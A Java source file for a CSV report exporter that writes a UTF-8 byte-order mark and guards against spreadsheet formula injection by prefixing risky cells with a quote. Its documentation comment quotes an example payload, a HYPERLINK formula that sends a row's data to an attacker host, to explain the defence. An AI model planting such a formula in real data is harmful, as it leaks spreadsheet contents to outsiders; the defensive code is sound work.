package com.edunext.edutrack.api.feature.reports.export;

import com.edunext.edutrack.api.feature.reports.ReportDtos;
import org.springframework.stereotype.Component;

import java.io.BufferedWriter;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.Writer;
import java.nio.charset.StandardCharsets;
import java.util.List;
import java.util.Map;

/**
 * A-064 · CSV. RFC 4180, plus the two things RFC 4180 does not cover and every
 * naive CSV writer gets wrong.
 *
 * <h2>1. The BOM, and why a file that is correct still opens wrong</h2>
 *
 * <p>The bytes are UTF-8 and a leading byte-order mark is written. Excel on
 * Windows reads a BOM-less CSV in the system code page, so every name outside
 * ASCII arrives mangled — "Lakshmi Pillai" survives, an accented or Devanagari
 * name does not — and the file is not broken by any specification, which is why
 * the bug report says "the export is corrupted" and the file opens perfectly in
 * every other tool. Three bytes settle it.
 *
 * <h2>2. Formula injection, which is a vulnerability and not a formatting bug</h2>
 *
 * <p>A cell whose text begins {@code =}, {@code +}, {@code -}, {@code @}, tab or
 * carriage return is evaluated as a formula when the file is opened in Excel,
 * LibreOffice or Sheets. Ticket titles, project names and client names are all
 * user-supplied and all end up in exports, so a ticket titled
 * {@code =HYPERLINK("http://attacker/?"&A1,"click")} becomes a live link in a
 * spreadsheet a manager opens — with the row's data in the query string. The
 * classic form runs a local command through DDE.
 *
 * <p>The mitigation is to prefix such a cell with a single quote, which Excel
 * treats as "the rest is literal text" and which every other reader shows
 * verbatim. It is applied here rather than at the source because the value is
 * legitimate <em>data</em> — a ticket may honestly be called "-3 regression" —
 * and it is only dangerous in this one context. Sanitising it on the way into
 * the database would corrupt the ticket to protect a spreadsheet.
 *
 * <p>The same escape is applied in {@link XlsxReportExporter}: xlsx is more
 * dangerous, not less, because a real workbook can carry a formula in a typed
 * cell rather than merely a string that looks like one.
 */
@Component
class CsvReportExporter implements ReportExporter {

    /** Excel, LibreOffice and Sheets all evaluate a cell starting with one of these. */
    private static final String FORMULA_STARTERS = "=+-@\t\r";

    @Override
    public Format format() {
        return Format.CSV;
    }

    @Override
    public void write(OutputStream out, String reportTitle, String appliedScope,
                      List<ReportDtos.Column> columns, List<Map<String, Object>> rows) throws Exception {

        Writer writer = new BufferedWriter(new OutputStreamWriter(out, StandardCharsets.UTF_8));

        // U+FEFF, written as a character so the UTF-8 encoder emits EF BB BF.
        writer.write('﻿');

        // Two provenance lines before the header.
        //
        // A CSV has nowhere else to say what it is. Once this file is emailed
        // on, "Date-wise Report, your projects" is not recoverable from the rows
        // — and a reader who cannot tell an organisation-wide export from one
        // person's projects will read the smaller number as the whole truth.
        writeRow(writer, List.of(reportTitle));
        writeRow(writer, List.of("Scope: " + (appliedScope == null ? "not stated" : appliedScope)));
        writer.write("\r\n");

        writeRow(writer, columns.stream().map(ReportDtos.Column::label).toList());

        for (Map<String, Object> row : rows) {
            writeRow(writer, columns.stream().map(c -> render(row.get(c.key()))).toList());
        }

        // Flushed rather than closed: the stream belongs to the servlet
        // container, and closing it here would take the response with it.
        writer.flush();
    }

    /** CRLF per RFC 4180 — the line ending Excel expects on every platform. */
    private static void writeRow(Writer writer, List<String> cells) throws Exception {
        writer.write(String.join(",", cells.stream().map(CsvReportExporter::escape).toList()));
        writer.write("\r\n");
    }

    private static String render(Object value) {
        return value == null ? "" : String.valueOf(value);
    }

    /**
     * RFC 4180 quoting, with the formula guard applied first.
     *
     * <p>Order matters: the guard prepends a quote character to the <em>value</em>,
     * and the RFC's doubling then escapes it like any other quote. Doing it the
     * other way round would emit the guard outside the quoted field, where it is
     * a stray character rather than a literal marker.
     */
    static String escape(String value) {
        String guarded = value;
        if (!value.isEmpty() && FORMULA_STARTERS.indexOf(value.charAt(0)) >= 0) {
            guarded = "'" + value;
        }

        boolean needsQuoting = guarded.indexOf(',') >= 0
                || guarded.indexOf('"') >= 0
                || guarded.indexOf('\n') >= 0
                || guarded.indexOf('\r') >= 0
                // A leading or trailing space is stripped by some readers unless
                // the field is quoted, which silently changes a value.
                || guarded.startsWith(" ")
                || guarded.endsWith(" ");

        if (!needsQuoting) {
            return guarded;
        }
        return '"' + guarded.replace("\"", "\"\"") + '"';
    }
}
